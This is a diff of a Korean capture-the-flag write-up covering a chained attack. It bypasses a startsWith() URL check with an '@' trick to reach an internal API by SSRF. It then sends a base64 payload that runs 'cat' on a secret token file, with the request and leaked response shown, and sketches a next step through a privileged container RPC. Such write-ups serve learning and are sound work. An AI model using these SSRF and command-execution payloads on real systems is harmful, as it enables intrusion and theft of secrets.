@@ -66,9 +66,9 @@ const PartnerOps = (() => {
   }
 ```
 
-startsWith() 함수로, 사용자 입력값이 'http://partners.bdsec.local'로 시작해야 한다는 조건이 붙는데, 이는 `@`를 이용해 우회 가능하다.
+startsWith() 함수로, 사용자 입력값이 'http://partners.bdsec.local'로 시작해야 한다는 조건이 붙는데 이는 `@`를 이용해 우회 가능하다.
 
-기본적인 URL 구조에서 `@` 앞부분은 사용자 정보로 인식된다. `http://username:password@주소:포트/경로`인 셈이다. 이때문에 http://partners.bdsec.local@internal-api:9000를 입력하면, 조건문에선 http://partners.bdsec.local로 시작해 통과하지만, 실상 처리되는 URL은 internal-api:9000인 셈이다.
+기본적인 URL 구조에서 `@` 앞부분은 사용자 정보로 인식된다. `http://username:password@주소:포트/경로`인 셈이다. 이때문에 http://partners.bdsec.local@internal-api:9000를 입력하면 조건문에선 http://partners.bdsec.local로 시작해 통과하지만, 실상 처리되는 URL은 internal-api:9000인 셈이다.
 
 `http://partners.bdsec.local@internal-api:9000`를 입력하면 응답은 다음과 같다.
 
@@ -147,11 +147,54 @@ http%3A%2F%2Fpartners.bdsec.local%40internal-api%3A9000/job&method=POST&body_b64
 
 
 
-> BDSEC Insane CTF - 내부 전용 서비스 (Stage 2: 커스텀 프로토콜 RCE)<br>이 서비스는 호스트에 절대 노출되지 않으며, 백엔드 네트워크 외부에서의 접근 경로도 없습니다. 다음의 경우에만 접근 가능합니다:
+> BDSEC Insane CTF - 내부 전용 서비스 (Stage 2: 커스텀 프로토콜 RCE)<br>이 서비스는 호스트에 절대 노출되지 않으며, 백엔드 네트워크 외부에서의 접근 경로도 없습니다. 다음의 경우에만 접근 가능합니다:<br>
+> (a) 이미 백엔드 네트워크 내부에 있는 경우 직접 접근, 또는<br>
+  (b) `web` 서비스를 통한 Stage 1 SSRF 우회 공격.
 
+여기서 SSRF를 이용해 1단계를 통과했고, 이 app.py를 읽음으로서 2단계도 통과했다.
 
 
 > 어떤 핸들러로든 첫 번째 요청이 성공적으로 도달하면, 이 서비스는 인스턴스별 일회용 토큰을 `/app/.internal_token`에 기록합니다. 이 파일은 `worker` 사용자만 읽을 수 있습니다. 해당 토큰은 3단계(dind-gate/app.py 참조)에서 필요합니다. 이는 단순히 파서 오류를 유발한 것이 아니라, 실제로 코드 실행을 달성했음을 입증하는 아티팩트(결과물)입니다.
+
+
+다음 단계는 3단계인데, dind-gate를 호출하는 것이다. 그리고 호출에 성공하면 매번 바뀌는 토큰을 발급해 `/app/.internal_token`에 저장한다는 것을 알 수 있다.
+
+stage2_generatePayload.js를 `cat /app_shared/.internal_token`를 넣어 실행시키면 다음과 같은 base64가 나온다. ( ls -al을 넣어 전송해보면 알겠지만, app 디렉토리엔 .internal_token가 없다. 풀이자의 4번을 보면 app_shared를 참조한다. app_shared는 여러 컨테이너가 공유하는 공유 볼륨(Volume)이라고 한다.)
+
+`partner_url=http%3A%2F%2Fpartners.bdsec.local%40internal-api%3A9000/job&method=POST&body_b64=AAAACnN5c3RlbS5ydW4AAAAfY2F0IC9hcHBfc2hhcmVkLy5pbnRlcm5hbF90b2tlbg%3D%3D`
+```
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.8 Python/3.11.15
+Date: Wed, 22 Jul 2026 18:26:04 GMT
+Content-Type: application/json
+Content-Length: 81
+Connection: close
+
+{"body":"{\"result\":\"494860051f233327634b137760eedad7\"}\n","status_code":200}
+
+```
+
+이어 `/static/js/ops-console.js`에서 dind-gate 부분을 보자면 `POST dind-gate/7000/rpc`로 요청 가능하며 파라미터는 위에서의 토큰, cmd(실행명령), opts인 것을 알 수 있다.
+
+```
+  *   PartnerOps.buildRpc(token, cmd, opts) // dind-gate rpc shape
+
+  // dind-gate rpc shape (OPS-410, internal orchestration proxy):
+  //   POST /rpc  { token, op: "run", image, cmd: [...], binds: [...], privileged }
+  // token = 작업이 실제로 실행된 후 internal-api가 반환하는 값 —
+  // 세션 비밀값(session secret)처럼 취급하세요. dind-gate가 확인하는 유일한 정보입니다.
+  function buildRpc(token, cmd, opts = {}) {
+    return {
+      token,
+      op: "run",
+      image: opts.image || "alpine",
+      cmd,
+      binds: opts.binds || [],
+      privileged: !!opts.privileged,
+    };
+  }
+
+```
 
 ## 📚 Lessons Learned
 
